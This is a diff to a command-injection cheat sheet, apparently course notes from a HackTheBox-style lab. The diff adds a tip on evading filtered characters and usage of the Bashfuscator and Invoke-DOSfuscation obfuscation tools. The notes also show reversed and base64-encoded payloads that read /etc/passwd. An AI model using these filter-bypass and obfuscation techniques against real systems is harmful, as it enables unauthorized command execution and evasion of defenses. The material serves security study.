@@ -1,6 +1,7 @@
 # Command Injection
 - [Linux](#linux)
 - [Windows](#windows)
+- [Evasion Tools](#evasion-tools)
 
 
 ## Injection Operators
@@ -17,6 +18,9 @@
 | Sub-Shell       | `$()`                 | `%24%28%29`           | Both (Linux-only) |
 
 ---
+
+> [!TIP]
+> we are using `<<<` to avoid using a pipe `|`, which is a filtered character.
 
 ## Linux  
 ### Filtered Character Bypass  
@@ -62,14 +66,14 @@
 
 | Code | Description |
 |------|------------|
-| `echo 'whoami' | rev` | Reverse a string |
+| `echo 'whoami' \| rev` | Reverse a string |
 | `$(rev<<<'imaohw')` | Execute reversed command |
 
 #### Encoded Commands  
 
 | Code | Description |
 |------|------------|
-| `echo -n 'cat /etc/passwd | grep 33' | base64` | Encode a string with base64 |
+| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |
 
 ---
@@ -121,13 +125,40 @@
 
 #### Encoded Commands  
 
+
 | Code | Description |
 |------|------------|
 | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
 | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))) "` | Execute b64 encoded string |
 
 
+## Evasion Tools
 
+- **Linux (Bashfuscator)**
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
 
+cd ./bashfuscator/bin/
+./bashfuscator -h
+
+./bashfuscator -c 'cat /etc/passwd'
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+- **Windows (DOSfuscation)**
+```bat
+PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+PS C:\htb> cd Invoke-DOSfuscation
+PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
+PS C:\htb> Invoke-DOSfuscation
+Invoke-DOSfuscation> help
+
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation> encoding
+Invoke-DOSfuscation\Encoding> 1
+```
 ## Resources
 - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
